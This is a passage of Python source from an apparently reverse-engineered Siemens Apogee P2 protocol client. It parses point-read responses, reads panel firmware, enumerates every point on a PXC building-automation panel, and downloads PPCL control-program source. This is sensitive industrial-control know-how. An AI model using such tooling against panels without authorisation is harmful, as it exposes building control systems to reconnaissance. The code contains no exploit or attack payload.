            b'\x01' + struct.pack('>H', len(pt_bytes)) + pt_bytes +
            b'\x00\xff'
        )

        msg = P2Message(self.op_msg_type, seq, read_payload)
        if not self._send_message(msg):
            return None

        # Wait for response
        resp = self._recv_response(seq)
        if resp is None:
            # No response at all — surface last_error if we have structured info
            if getattr(self, 'last_error', None):
                name, desc = self.last_error
                if DEBUG_READS:
                    print(f"    [DEBUG] {device}/{point_name}: AP2 error {name} ({desc})")
            elif DEBUG_READS:
                print(f"    [DEBUG] {device}/{point_name}: no response from PXC")
            return None

        parsed = self._parse_read_response(resp)
        if parsed is None and DEBUG_READS:
            print(f"    [DEBUG] {device}/{point_name}: parse failed")
            print(f"    [DEBUG]   response payload ({len(resp.payload)}B): {resp.payload.hex()}")
        return parsed

    def _parse_read_response(self, msg: P2Message) -> Optional[Dict[str, Any]]:
        """Parse a point read response message."""
        payload = msg.payload
        result = {
            'value': None,
            'units': '',
            'description': '',
            'point_name': '',
            'device_name': '',
            'data_type': 'unknown',
        }

        # ─── Status-byte error path (direction byte 0x05 + u16 BE error code after routing header)
        # This handles the common "object not found" case that reads hit on BLN-sourced
        # virtual points that don't exist on the target panel. Without this branch, the
        # response falls through to the value-block scan below and returns None, which loses
        # the distinction between "no response from PXC" and "PXC said no such point."
        if payload and payload[0] == P2Message.DIR_ERROR:
            # Advance past the 4 null-terminated routing-header strings
            i = 1
            nulls = 0
            while i < len(payload) and nulls < 4:
                if payload[i] == 0:
                    nulls += 1
                i += 1
            if i + 2 <= len(payload):
                err_code = struct.unpack('>H', payload[i:i+2])[0]
                err_name = _P2_STATUS_ERRORS.get(err_code, f'unknown_0x{err_code:04X}')
                result['error'] = {'code': err_code, 'name': err_name}
                if hasattr(self, 'last_error'):
                    self.last_error = (err_name, f'response status-byte error 0x{err_code:04X}')
                if DEBUG_READS:
                    print(f"    [DEBUG] PXC returned status-byte error: {err_name} (0x{err_code:04X})")
            # Keep the existing "return None on error" contract — callers check for None.
            return None

        # Find the value block. Confirmed from protocol analysis:
        #
        # ALL valid responses have this layout in the value block region:
        #   [last point_name LP-string] [01 00 00] [7 metadata bytes] [4-byte float]
        #                                                              ^^ float at +10
        #
        # Four observed shapes of the 7 metadata bytes:
        #   Shape A  (0x0271 resp, 3FFFFFFF case): 3f ff ff ff 00 00 00
        #   Shape B1 (0x0271 resp, zero-sentinel): 00 00 00 00 00 00 00
        #   Shape B2 (0x0220 resp, explicit type): 00 00 00 00 00 00 XX
        #            where XX = data-type code (0x03 = analog, etc.)
        #   Shape C  (app-2500-ish negative values): same as B1/B2 but float
        #            starts 0xbf (negative floats)
        #
        # Critical: the payload also has a TRAILING metadata block (min/max limits,
        # resolution) that looks almost identical to [01 00 00][zeros][float]. A
        # pure structural scan false-positives on it. The trailing block is always
        # preceded by bytes from the VALUE block itself (the float); the real
        # value block is always preceded by an ASCII character (last byte of a
        # length-prefixed point name string).
        #
        # So: scan FORWARD for [01 00 00] whose position-1 byte is an ASCII
        # character from A-Z, 0-9, space, or common punctuation. That's the
        # point-name tail, and the next 10 bytes are our value block.

        flags_idx = -1
        # Predicate must be tight: 0x0981 enumerate responses contain `01 00 00`
        # bytes embedded in per-entry metadata (e.g. `01 00 00 04 00 02 00 00`
        # right after the device-name TLV) whose preceding byte is ASCII —
        # those false-match a permissive scan. The sentinel at +3..+6 must be
        # one of the two known shapes (3F FF FF FF wildcard OR all-zero
        # explicit-flags), and byte +7 (the "reserved" byte of the 3-byte
        # status group) must be 0x00. Byte +8 (comm_status) is INTENTIONALLY
        # NOT constrained — it's 0x00 for live and 0x01 for STALE, and an
        # earlier version of this predicate that required +8 == 0x00 silently
        # filtered out every comm-faulted response (see APOGEE_P2_SPEC.md §15).
        #
        # Loop bound: marker (3 bytes) + 7-byte metadata + 4-byte float = 14 bytes,
        # so the highest valid `i` is len(payload) - 14, i.e. range stop = len - 13.
        # Off-by-one trap (APOGEE_P2_SPEC.md §14.5):
        # `len(payload) - 14` (one too small) misses the case where the float sits
        # at the very end of the payload with no trailing data — symptom is digital
        # points without a units TLV silently failing to parse.
        for i in range(1, len(payload) - 13):
            if not (payload[i]   == 0x01 and payload[i+1] == 0x00
                    and payload[i+2] == 0x00):
                continue
            # Sentinel shapes: see APOGEE_P2_SPEC.md §14.3.
            # Real value blocks have one of these patterns at +3..+6:
            #   `3F FF FF XX` — R1 ("quality flags" register), where XX
            #                   varies on the wire. APOGEE_P2_SPEC.md
            #                   documents `3F FF FF FF` but the F7 variant
            #                   (and possibly others — the bit pattern of
            #                   byte +6 encodes quality flags) is also
            #                   real and very common in the field.
            #   `00 00 00 00` — R2/R3 (explicit "all flags clear" / modern
            #                   compact form).
            # The 09xx enumerate response's per-entry metadata block
            # (`04 00 02 00`, `03 00 02 00`, etc. — fixed second byte 0x00,
            # third byte 0x02) shapes false-match a permissive scan; the
            # `3F FF FF` prefix check or the all-zero check filters those
            # out cleanly.
            sentinel_3fff = (payload[i+3] == 0x3F
                             and payload[i+4] == 0xFF
                             and payload[i+5] == 0xFF)
            sentinel_zero = payload[i+3:i+7] == b'\x00\x00\x00\x00'
            if not (sentinel_3fff or sentinel_zero):
                continue
            if payload[i+7] != 0x00:
                continue
            prev = payload[i-1]
            # Previous byte must be printable ASCII (end of point name string)
            # Accepted chars: A-Z, a-z, 0-9, space, period, underscore, hyphen
            is_asciiend = (
                (0x41 <= prev <= 0x5A) or   # A-Z
                (0x61 <= prev <= 0x7A) or   # a-z
                (0x30 <= prev <= 0x39) or   # 0-9
                prev in (0x20, 0x2E, 0x5F, 0x2D)  # space . _ -
            )
            if not is_asciiend:
                continue
            # Sanity: float byte should look plausible
            first_byte = payload[i + 10]
            # Accept positive floats 0..~2e5, negative floats, zero, and
            # digital-point raw bytes (0x00-0x01 range).
            if first_byte <= 0x48 or first_byte in (0xBF, 0xC0, 0xC1, 0xC2,
                                                    0xC3, 0xC4, 0xC5):
                flags_idx = i + 3
                break

        if flags_idx < 0:
            # No value block found — probably an error response, a device-summary
            # bulk read, or a characterization read (different opcode). Safe to
            # return None; --debug-reads will surface the raw hex for inspection.
            return None

        # Extract device name and point name from length-prefixed strings before flags
        pre_flags = payload[:flags_idx]
        lp_strings = self._extract_lp_strings(pre_flags)

        routing_names = {self.network, self.scanner_name, P2_SITE,
                        P2_NETWORK} | {s.split('|')[0] for s in [self.scanner_name] if '|' in s}
        data_strs = [s for s in lp_strings
                     if s.upper() not in {n.upper() for n in routing_names}
                     and not s.upper().startswith('NODE')]
        if len(data_strs) >= 2:
            result['device_name'] = data_strs[0]
            result['point_name'] = data_strs[1]
            if len(data_strs) >= 3:
                result['description'] = data_strs[2]

        # Extract value after flags
        # [3F FF FF F7] [00 XX YY] [4-byte float]
        # XX = comm status: 00=online, 01=comm fault (offline)
        # YY = error code (06 = typical comm error)
        after_flags = payload[flags_idx + 3:]
        if len(after_flags) >= 8:
            # Check comm status flag (byte +2 after 3FFFFF)
            comm_status = after_flags[2] if len(after_flags) > 2 else 0
            result['comm_status'] = 'online' if comm_status == 0 else 'comm_fault'
            result['comm_error_code'] = after_flags[3] if len(after_flags) > 3 else 0

            # Surface the 4-byte property-state slot — adjacent to (not part of)
            # the float value. In decomp this appears to be a sentinel: 3FFFFFFF
            # means "no specific quality flags set"; 00000000 means "explicit
            # quality flags, all cleared." Unverified whether 00000000 implies
            # a cached/stale value vs a fresh poll. Surfacing so users can spot
            # patterns across devices.
            result['property_state_hex'] = payload[flags_idx:flags_idx + 4].hex()

            val_offset = 4  # skip flag tail byte + status bytes
            raw_val = after_flags[val_offset:val_offset + 4]
            if len(raw_val) == 4:
                result['value'] = struct.unpack('>f', raw_val)[0]
                result['value_raw_hex'] = raw_val.hex()

                # Determine data type from byte before value
                dtype_byte = after_flags[3] if len(after_flags) > 3 else 0
                if dtype_byte == 0x03:
                    result['data_type'] = 'analog'
                elif dtype_byte == 0x00:
                    result['data_type'] = 'binary' if result['value'] in (0.0, 1.0) else 'analog'

        # Extract units from after the value. Units arrive as length-prefixed
        # strings; some devices pad with a leading space (e.g. " CFM"), so we
        # strip before matching.
        after_val = payload[flags_idx + 3 + 8:]
        unit_whitelist = {
            'DEG F', 'DEG C', 'DEGF', 'DEGC',
            'PCT', '%', 'PERCENT',
            'SEC', 'MIN', 'HRS', 'HR', 'MS',
            'CFM', 'FPM', 'CF', 'FT3/MIN',
            'GPM', 'LPM', 'LPS',
            'PSI', 'KPA', 'INHG', 'IN WC', 'IN.WC', 'PA',
            'AMPS', 'VOLTS', 'V', 'A', 'MA', 'MV',
            'KW', 'KWH', 'BTU', 'BTUH', 'W', 'WH',
            'PPM', 'PPB',
            'RPM', 'HZ', 'KHZ',
            'FT', 'IN', 'M', 'MM', 'CM',
        }
        for s in self._extract_lp_strings(after_val):
            s_clean = s.strip().upper()
            if s_clean in unit_whitelist:
                result['units'] = s.strip()  # preserve original casing minus padding
                break

        return result

    @staticmethod
    def _extract_lp_strings(data: bytes) -> List[str]:
        """Extract length-prefixed strings (01 00 [len] [str] or 00 01 00 [len] [str])."""
        strings = []
        i = 0
        while i < len(data) - 3:
            # Pattern: 01 00 [len] [string]
            if data[i] == 0x01 and data[i+1] == 0x00 and 0 < data[i+2] < 100:
                slen = data[i+2]
                if i + 3 + slen <= len(data):
                    try:
                        s = data[i+3:i+3+slen].decode('ascii')
                        if s.isprintable():
                            strings.append(s)
                            i += 3 + slen
                            continue
                    except Exception:
                        pass
            # Pattern: 00 01 00 [len] [string]
            if (i < len(data) - 4 and data[i] == 0x00 and data[i+1] == 0x01
                    and data[i+2] == 0x00 and 0 < data[i+3] < 100):
                slen = data[i+3]
                if i + 4 + slen <= len(data):
                    try:
                        s = data[i+4:i+4+slen].decode('ascii')
                        if s.isprintable():
                            strings.append(s)
                            i += 4 + slen
                            continue
                    except Exception:
                        pass
            i += 1
        return strings

    # ── Additional opcodes identified from multi-panel packet captures ──

    def read_system_info_compact(self, node_name: str = "node") -> Optional[Dict[str, Any]]:
        """Read panel model/firmware/build via opcode 0x010C (2-byte request).

        Works on newer PXC firmware (PME1300 / V2.8.18-era). Falls back to the
        legacy 0x0100 GetRevString externally via `get_node_info()` if this returns
        None. Response carries three TLV strings followed by ~16 bytes of feature
        flags, an embedded IdentifyBlock, and panel state fields.

        Returns dict with 'model', 'firmware', 'build_date', 'node_number',
        'raw_strings' — or None on failure.
        """
        seq = self._next_seq()
        routing = self._build_routing(node_name)
        body = struct.pack('>H', P2Message.OP_SYSINFO_COMPACT)
        msg = P2Message(self.op_msg_type, seq, routing + body)
        if not self._send_message(msg):
            return None
        resp = self._recv_response(seq)
        if resp is None or not resp.payload or resp.payload[0] == P2Message.DIR_ERROR:
            return None
        strings = self._extract_lp_strings(resp.payload)
        # Drop anything that looks like a routing-header name
        routing_set = {self.network, self.scanner_name, P2_SITE,
                       node_name.upper(), node_name.lower()}
        data_strings = [s for s in strings if s not in routing_set]
        result = {
            'model': data_strings[0].strip() if len(data_strings) > 0 else '?',
            'firmware': data_strings[1] if len(data_strings) > 1 else '?',
            'build_date': data_strings[2] if len(data_strings) > 2 else '',
            'raw_strings': data_strings,
        }
        # Cache the firmware-build tag for the §30.4 dialect fast-path.
        # The "model" TLV (Siemens-internally labeled) actually holds the
        # build identifier like "PME1300 ". Subsequent connects to this
        # host will skip the §11.2 dialect probe via firmware_registry.
        build_tag = firmware_registry.parse_build_tag(result['model'])
        if build_tag:
            firmware_registry.cache_build_tag(self.host, build_tag)
            result['build_tag'] = build_tag
            if build_tag not in firmware_registry.KNOWN_BUILDS:
                # Spec §30.5 limitation 4 — log unknown builds with full
                # context so the registry can be extended.
                print(f"  [INFO] Unknown firmware build {build_tag} on "
                      f"{self.host} — full revstring: model={result['model']!r}, "
                      f"firmware={result['firmware']!r}, "
                      f"build_date={result['build_date']!r}. Heuristic "
                      f"classification: "
                      f"{firmware_registry.classify_unknown_build(build_tag)}.")
        # Byte at offset ~0x68 of the response payload encodes the node number.
        # Offset varies slightly by firmware; search for the NODE name TLV and
        # back up 3 bytes.
        # For now, caller can inspect raw_strings for reliability.
        return result

    def enumerate_all_points(self, node_name: str = "node",
                             max_points: int = 10000) -> List[Dict[str, Any]]:
        """Walk every point on the panel using opcode 0x0981 with cursor pagination.

        0x0981 is more complete than 0x0986 (EnumerateFLN): it returns panel-internal
        points (PPCL variables, scheduled points, global analogs) in addition to
        TEC-device points.

        Request body framing (empirically verified from packet captures):
            09 81                   opcode
            00 00                   2-byte header
            01 00 01 2a             TLV: first filter, always "*"
            01 00 01 2a             TLV: second filter, always "*"
            00 00                   separator
            01 00 LL <cursor>       TLV: cursor = previous response's device name,
                                          or empty (len=0) on the first call
            01 00 00                empty TLV trailer

        Cursor advancement strategy:
            Normally the panel returns the next point alphabetically after the
            cursor. When the cursor matches a point name that has a compound
            identity (device + subkey, e.g. "BCCW" + "DAY.NGT"), the panel
            sometimes returns the same record again because its internal index
            uses the compound key and our single-name cursor doesn't advance
            past it. Detection: if we get the same device name back, try
            incrementing the last byte of the cursor (e.g. "BCCW" → "BCCX"),
            which forces the panel to skip past the stuck entry and return
            whatever comes next alphabetically. Give up after several such
            retries to avoid infinite loops on genuinely-empty panels.
        """
        results = []
        cursor = b''   # empty on first call
        seen_devices = set()

        def send_and_parse(cur: bytes):
            """Send one enumerate request and return (parsed_dict or None)."""
            seq = self._next_seq()
            routing = self._build_routing(node_name)
            body = (struct.pack('>H', P2Message.OP_ENUM_POINTS) +
                    b'\x00\x00' +
                    b'\x01\x00\x01\x2a' +   # first filter = "*"
                    b'\x01\x00\x01\x2a' +   # second filter = "*"
                    b'\x00\x00' +
                    b'\x01' + struct.pack('>H', len(cur)) + cur +
                    b'\x01\x00\x00')
            msg = P2Message(self.op_msg_type, seq, routing + body)
            if not self._send_message(msg):
                return None
            resp = self._recv_response(seq)
            if resp is None:
                return None
            if resp.payload and resp.payload[0] == P2Message.DIR_ERROR:
                return None
            return self._parse_enum_points_response(resp.payload)

        def build_advance_cursors(cur: bytes):
            """Yield successively more aggressive cursor mutations to force
            advance past a stuck entry.

            Strategy order (minimal advance first to preserve adjacent points):
              1. Append 0x01 — `cur + \\x01` is the smallest string > cur.
                 Example: "DIVV1" → "DIVV1\\x01"
                 Returns the next entry after "DIVV1", which could be
                 "DIVV10.STPT", "DIVV1T", or any longer prefix match.
              2. Append ' ' (0x20) — space, first printable byte.
              3. Append '0' (0x30) — matches numeric-suffix points.
              4. Append 'A' (0x41) — matches alpha-suffix points.
              5. Append 'a' (0x61) — matches lowercase-suffix points.
              6. Append '~' (0x7E) — jumps past all printable-suffix entries
                 that start with cur.
              7. Byte-increment last character — "DIVV1" → "DIVV2".
                 This is a big jump that skips everything with prefix "DIVV1".
                 Only used as a last resort when all appends stall.
              8. Increment + append space — last-ditch attempt.

            Each mutation is strictly > cur in memcmp-with-length-tiebreak order.
            """
            if not cur:
                yield b'\x01'
                return
            # Append mutations from smallest to largest suffix
            for suffix in (b'\x01', b' ', b'0', b'A', b'a', b'~'):
                yield cur + suffix
            # Byte-increment the last character
            last = cur[-1]
            if last < 0x7E:
                yield cur[:-1] + bytes([last + 1])
                # And increment + space suffix
                yield cur[:-1] + bytes([last + 1]) + b' '
            else:
                yield cur + b'\x01' + b'\x01'

        for _ in range(max_points):
            parsed = send_and_parse(cursor)
            if parsed is None:
                break

            dev_name = parsed['device']

            if dev_name in seen_devices:
                # Cursor stalled — panel returned a record we've already seen.
                # This commonly happens on compound-identity points (e.g. BCCW
                # with subkey DAY.NGT) where our single-name cursor can't
                # advance past the compound record.
                #
                # Try a sequence of cursor mutations starting with the minimal
                # advance (append \x01, which gives the smallest string > cur)
                # so we don't accidentally skip over adjacent entries with the
                # same prefix. Fall back to byte-increment only as last resort.
                advanced = False
                for candidate in build_advance_cursors(cursor):
                    cursor = candidate
                    retry = send_and_parse(cursor)
                    if retry is None:
                        break
                    if retry['device'] not in seen_devices:
                        # Escaped the stall — accept this record
                        parsed = retry
                        dev_name = parsed['device']
                        advanced = True
                        break
                if not advanced:
                    # Either the panel genuinely has no more points or we
                    # couldn't find a cursor mutation that gets past the stuck
                    # entry. Either way, terminate.
                    break

            seen_devices.add(dev_name)
            results.append(parsed)

            # Advance cursor with the DEVICE name from this response
            cursor = dev_name.encode('ascii', errors='replace')

        return results

    @staticmethod
    def _parse_enum_points_response(payload: bytes) -> Optional[Dict[str, Any]]:
        """Extract {device, point, value, units} from a 0x0981 response payload.

        Three response shapes observed. The shape the panel picks depends on
        (a) firmware dialect (PME1252 vs PME1300) and (b) point type (physical
        sensor with a quality register vs PPCL-computed variable vs Title-only
        panel entry).

        SHAPE A — physical point with quality sentinel (real sensor value):
            [routing header]
            00 00
            01 00 LL <dev>              device name (often repeated 3x)
            01 00 LL <point>            point name
            01 00 LL <description>      description
            3F FF FF Fx 00 00 04        quality sentinel + marker
            <f32 value>
            01 00 LL <units>            units

        SHAPE B — PPCL-computed variable with value, no quality register
                  (e.g. a computed setpoint returning a float in engineering units):
            [routing header]
            00 00
            01 00 LL <name>             point name (repeated 3x)
            01 00 LL <description>      description
            00 00 00 00 00 00 02        7-byte zero-ish metadata (last byte = data-type code)
            <f32 value>
            00 00 00                    3-byte pad
            01 00 LL <units>            units

        SHAPE C — "Title"-only panel entry (label-only, no value, no units):
            [routing header]
            00 00
            01 00 LL <fullname>         full point name (repeated)
            01 00 LL <description>      human description
            <metadata — NO quality sentinel, NO float, NO units TLV>

        The disambiguator: scan forward from after the description TLV looking for
        a units TLV. If found, there's a value between description and units —
        extract it as f32 from the 4 bytes immediately before the units TLV header.
        The presence of a `3F FF FF F?` sentinel is a useful hint for SHAPE A but
        isn't required; SHAPE B points have real values with no sentinel.

        Returns {'device', 'point', 'value', 'units', 'description'}. For SHAPE C,
        device == point, value is None, units is empty, description carries the
        label.
        """
        # Skip routing header (4 null-terminated strings)
        i = 1
        nulls = 0
        while i < len(payload) and nulls < 4:
            if payload[i] == 0:
                nulls += 1
            i += 1
        if i >= len(payload):
            return None
        body = payload[i:]

        # Collect all TLVs (tag=0x01, u16 BE length, value)
        tlvs = []
        p = 0
        while p + 3 <= len(body):
            if body[p] == 0x01:
                L = struct.unpack('>H', body[p+1:p+3])[0]
                if 0 <= L < 256 and p + 3 + L <= len(body):
                    tlvs.append((p, L, body[p+3:p+3+L]))
                    p += 3 + L
                    continue
            p += 1

        # First non-empty printable ASCII TLV is the device/primary name
        dev = None
        dev_positions = []
        for pos, L, val in tlvs:
            if L == 0:
                continue
            try:
                s = val.decode('ascii')
            except UnicodeDecodeError:
                continue
            if not s.isprintable():
                continue
            if dev is None:
                dev = s
            if s == dev:
                dev_positions.append(pos)
        if dev is None:
            return None

        # Compound-name detection. Some panels return entries with TWO ASCII
        # name TLVs in a row at the top of the body (instead of one name + an
        # empty-TLV separator). Example:
        #     01 00 04 ZN01  01 00 07 DAY.SCH  02 00 02 00 00 ...
        # vs normal:
        #     01 00 07 RM TEMP  01 00 00  02 00 02 00 00 ...
        # The second name is a sub-key (some kind of subfield — schedule slot,
        # point group, etc.). It's NOT units and NOT description — treating it
        # as units (as earlier parser versions did) mangles display and can
        # misalign value extraction. Detect it and set it aside so the rest of
        # the parser ignores it.
        #
        # Detection: if the FIRST ASCII TLV after the first device occurrence
        # (still within the "header" region, before the metadata bytes) is a
        # non-empty ASCII TLV different from dev, we have a compound name.
        subkey = ''
        subkey_positions = set()
        if dev_positions:
            first_dev_end = dev_positions[0] + 3 + len(dev)
            # Look at the very next TLV
            for pos, L, val in tlvs:
                if pos < first_dev_end:
                    continue
                # The first TLV we see after the dev must be either empty
                # (normal case) or a non-empty ASCII TLV (compound case).
                if L == 0:
                    break  # normal — no subkey
                try:
                    s = val.decode('ascii')
                except UnicodeDecodeError:
                    break
                if not s.isprintable() or s == dev:
                    break
                # Found a compound subkey
                subkey = s
                # Find all positions where this subkey appears — we'll
                # exclude them from units/description candidates
                for p2, L2, val2 in tlvs:
                    if L2 == 0:
                        continue
                    try:
                        s2 = val2.decode('ascii')
                    except UnicodeDecodeError:
                        continue
                    if s2 == subkey:
                        subkey_positions.add(p2)
                break

        # Next ASCII TLV after the last device repetition is either:
        #   - a point name (SHAPE A with separate dev/point, rare)
        #   - a description (SHAPE B or C — dev == point, description is distinct)
        # We'll collect all ASCII TLVs past the last device repetition so we can
        # distinguish SHAPE A (where there's typically a point name BEFORE the
        # description, differing from dev) from SHAPE B/C.
        after_last_dev = (dev_positions[-1] + 3 + len(dev)) if dev_positions else 0
        subsequent = []
        for pos, L, val in tlvs:
            if pos <= after_last_dev or L == 0:
                continue
            if pos in subkey_positions:
                # Don't let a compound-name subkey be mistaken for units or desc
                continue
            try:
                s = val.decode('ascii')
            except UnicodeDecodeError:
                continue
            if s.isprintable() and s != subkey:
                subsequent.append((pos, L, s))

        if not subsequent:
            # No description or units found — return dev-only
            return {'device': dev, 'point': dev, 'value': None,
                    'units': '', 'description': '', 'subkey': subkey}

        # Quality sentinel hint for SHAPE A
        q_idx = -1
        for p in range(len(body) - 4):
            if body[p] == 0x3F and body[p+1] == 0xFF and body[p+2] == 0xFF:
                q_idx = p
                break

        # Find a units TLV. Real engineering units are narrow: short, no internal
        # multi-word spaces (except known patterns like "DEG F", "IN H20"). Multi-
        # word strings like "BLR 2 ALM" are descriptions, not units, even when short.
        #
        # Heuristic: a units string is <= 8 chars and either has no spaces OR
        # starts with "DEG " / "IN " (the only two space-containing unit patterns
        # we've seen). Also accept single-char units like "%".
        def looks_like_units(s: str) -> bool:
            s = s.strip()
            if not s: return False
            if len(s) > 8: return False
            # Single char / no-space units: "%", "MA", "PSI", "CFM", "PPM", etc.
            if ' ' not in s: return True
            # Space-containing patterns we accept as units
            if s.startswith('DEG ') or s.startswith('deg '): return True
            if s.startswith('IN '): return True
            return False

        units_candidates = []
        for (pos, L, s) in subsequent:
            if s == dev:
                continue
            if L <= 10 and L > 0 and looks_like_units(s):
                units_candidates.append((pos, L, s.strip()))

        # The units TLV, if present, is typically the LAST ASCII TLV in the body
        # (before trailing binary metadata). Pick the last candidate.
        units_pos = None
        units_str = ''
        if units_candidates:
            units_pos, units_L, units_str = units_candidates[-1]

        # Description: first ASCII TLV after the last device repetition that isn't units
        description = ''
        point_name = dev
        for (pos, L, s) in subsequent:
            if s == dev:
                continue
            if units_pos is not None and pos == units_pos:
                continue
            # In SHAPE A, there's sometimes a distinct point name before the description.
            # Detect this: if we see a non-dev ASCII TLV that's followed by another
            # ASCII TLV (the description) before the quality sentinel or units, then
            # this first one is the point name.
            description = s
            break

        # Try to extract a float value. Three sources in order of reliability:
        #   1. If quality sentinel present (SHAPE A), offset +7/+4/+8 past it.
        #      Physical points with a quality register use this.
        #   2. SHAPE B marker: `00 00 00 00 00 00 XX` (6 zeros + data-type byte)
        #      immediately after the description TLV, followed by an f32.
        #      Covers all PME1300 computed/binary points — with or without units.
        #   3. Fall back to offset-relative-to-units-TLV for edge cases.
        #   4. Otherwise no value.
        value = None

        if q_idx >= 0:
            # SHAPE A: value lives past the quality sentinel
            for offset in (7, 4, 8):
                if q_idx + offset + 4 <= len(body):
                    try:
                        candidate = struct.unpack('>f', body[q_idx+offset:q_idx+offset+4])[0]
                        if candidate == candidate and -1e10 < candidate < 1e10:
                            value = candidate
                            break
                    except struct.error:
                        continue

        if value is None:
            # SHAPE B marker scan — 6 zero bytes followed by a small data-type
            # code (observed: 01, 02, 03, 04, 05, 06), then the f32 in the next
            # 4 bytes.
            #
            # The SHAPE B layout is:
            #     [description TLV] [7-byte meta] [f32] [3-byte pad] [units TLV]
            # So the value sits BETWEEN the description TLV and the units TLV.
            # Scan in that window, not after the last ASCII TLV (which would
            # typically be units, already past the value).
            #
            # Start scan: immediately after the FIRST non-dev ASCII TLV
            # (which is the description). Stop scan: before the units TLV
            # if present, else to end of body.
            scan_start = 0
            scan_end = len(body) - 11
            if subsequent:
                first_pos, first_L, _ = subsequent[0]
                scan_start = first_pos + 3 + first_L
                if units_pos is not None and units_pos > scan_start:
                    scan_end = units_pos
            for p in range(scan_start, min(scan_end, len(body) - 11)):
                if (body[p] == 0 and body[p+1] == 0 and body[p+2] == 0 and
                    body[p+3] == 0 and body[p+4] == 0 and body[p+5] == 0 and
                    body[p+6] in (0x01, 0x02, 0x03, 0x04, 0x05, 0x06)):
                    try:
                        candidate = struct.unpack('>f', body[p+7:p+11])[0]
                        if candidate == candidate and -1e10 < candidate < 1e10:
                            value = candidate
                            break
                    except struct.error:
                        continue

        if value is None and units_pos is not None and units_pos >= 4:
            # SHAPE B extraction: f32 sits before the units TLV header.
            # Layout: [7-byte meta][f32][3-byte pad][01 00 LL units]
            # So the float is at units_pos - 3 - 4 = units_pos - 7.
            # SHAPE A may also have a units TLV but the bytes before are
            # structural (00 00 04 [f32]); that float is 4 before units_pos
            # in the A layout. Try -7 first (B), then -4 (A), then -8.
            for back in (7, 4, 8):
                if units_pos - back >= 0:
                    try:
                        candidate = struct.unpack('>f', body[units_pos-back:units_pos-back+4])[0]
                        if candidate == candidate and -1e10 < candidate < 1e10:
                            # Sanity check: reject tiny non-zero "noise" values that
                            # come from misaligned reads of zero bytes. Values in the
                            # range of sub-picovolt (|x| < 1e-6) with nonzero bits are
                            # almost certainly misaligned interpretations.
                            if abs(candidate) < 1e-6 and candidate != 0.0:
                                continue
                            value = candidate
                            break
                    except struct.error:
                        continue

        if value is None and q_idx >= 0:
            # SHAPE A fallback: value lives past the quality sentinel
            for offset in (7, 4, 8):
                if q_idx + offset + 4 <= len(body):
                    try:
                        candidate = struct.unpack('>f', body[q_idx+offset:q_idx+offset+4])[0]
                        if candidate == candidate and -1e10 < candidate < 1e10:
                            value = candidate
                            break
                    except struct.error:
                        continue

        # Final classification:
        # - If we found a value OR a units TLV OR a sentinel → valued point (A or B)
        # - Otherwise → SHAPE C (Title-only, device==point, description only)
        if value is not None or units_pos is not None or q_idx >= 0:
            return {'device': dev, 'point': point_name or dev,
                    'value': value, 'units': units_str,
                    'description': description if description != dev else '',
                    'subkey': subkey}
        else:
            # SHAPE C — title-only, no value
            return {'device': dev, 'point': dev, 'value': None,
                    'units': '', 'description': description.strip(),
                    'subkey': subkey}

    def read_programs(self, node_name: str = "node",
                      max_requests: int = 5000) -> List[Dict[str, Any]]:
        """Enumerate PPCL programs via opcode 0x0985 — response carries source text.

        The cursor protocol for 0x0985 is two-level:
          1. Program name cursor (advances when a program is exhausted)
          2. Line number cursor (advances within a program, 10 lines per chunk)

        Request body format (different from 0x0981 — only ONE filter TLV):
            09 85                   opcode
            00 00                   2-byte header
            01 00 01 2a             filter TLV = "*" (single, not double)
            00 00                   separator
            01 00 LL <program>      program name (empty string on first call)
            NN NN                   u16 BE line number to fetch (0 on first call)

        Response body format:
            00 00                   separator
            01 00 LL <program>      program name (PXC's current position)
            01 00 06 <module_tag>   6-char module type (e.g. "ET    " "D     " "DT    ")
            01 00 LL <source_chunk> PPCL source code chunk (one or more lines)
            NN NN                   u16 BE next-line hint (where to resume)
            HH                      has-more flag: 0x01=more of this program, 0x00=done
            01 00 00 00             4-byte trailer

        Termination: when we ask for a line past the end of the LAST program,
        the PXC returns a 2-byte error body `00 03` (DIR_ERROR + code 0x0003).

        Returns list of {'name': ..., 'module': ..., 'code': ...} with full source
        text per program.
        """
        # Accumulate chunks per program name
        by_program: Dict[str, Dict[str, Any]] = {}
        prog_order: List[str] = []

        current_name = b''   # empty on first call — PXC treats as "start"
        current_line = 0
        requests_made = 0
        seen_states = set()

        while requests_made < max_requests:
            requests_made += 1
            seq = self._next_seq()
            routing = self._build_routing(node_name)
            body = (struct.pack('>H', P2Message.OP_ENUM_PROGRAMS) +
                    b'\x00\x00' +
                    b'\x01\x00\x01\x2a' +                         # single filter "*"
                    b'\x00\x00' +
                    b'\x01' + struct.pack('>H', len(current_name)) + current_name +
                    struct.pack('>H', current_line))              # u16 BE line number
            msg = P2Message(self.op_msg_type, seq, routing + body)
            if not self._send_message(msg):
                break
            resp = self._recv_response(seq)
            if resp is None:
                break
            if resp.payload and resp.payload[0] == P2Message.DIR_ERROR:
                # PXC says no more programs — normal end-of-list termination.
                break

            parsed = self._parse_program_response(resp.payload)
            if parsed is None:
                break

            prog = parsed['program']
            module = parsed['module']
            code_chunk = parsed['code']
            next_line = parsed['next_line']

            # Accumulate the code chunk into the program record
            if prog not in by_program:
                by_program[prog] = {'name': prog, 'module': module, 'code': ''}
                prog_order.append(prog)
            if code_chunk:
                existing = by_program[prog]['code']
                by_program[prog]['code'] = (existing + '\n' + code_chunk) if existing else code_chunk

            # Always advance using what the PXC returned. The has_more flag's exact
            # semantic was unreliable in captures (it can be 0 mid-program too), so
            # we rely on the PXC returning 0x0003 to signal end-of-list.
            next_name = prog.encode('ascii')

            # Loop guard: if we've been at this exact (name, line) before, bail.
            # Protects against a PXC that parks on a line without advancing.
            state_key = (next_name, next_line)
            if state_key in seen_states:
                break
            seen_states.add(state_key)

            current_name = next_name
            current_line = next_line

        return [by_program[name] for name in prog_order]

    @staticmethod
    def _parse_program_response(payload: bytes) -> Optional[Dict[str, Any]]:
        """Parse a 0x0985 response payload.

        Returns {program, module, code, next_line, has_more} or None.
        """
        # Skip routing header
        i = 1
        nulls = 0
        while i < len(payload) and nulls < 4:
            if payload[i] == 0:
                nulls += 1
            i += 1
        if i >= len(payload):
            return None
        body = payload[i:]

        # Expect: 00 00, then 3 TLVs, then next_line(u16) + has_more(u8) + trailer
        if len(body) < 2 or body[0:2] != b'\x00\x00':
            return None

        # Walk TLVs starting at offset 2
        tlvs = []
        p = 2
        while p + 3 <= len(body):
            if body[p] == 0x01:
                L = struct.unpack('>H', body[p+1:p+3])[0]
                if 0 <= L < 8192 and p + 3 + L <= len(body):
                    tlvs.append((p, L, body[p+3:p+3+L]))
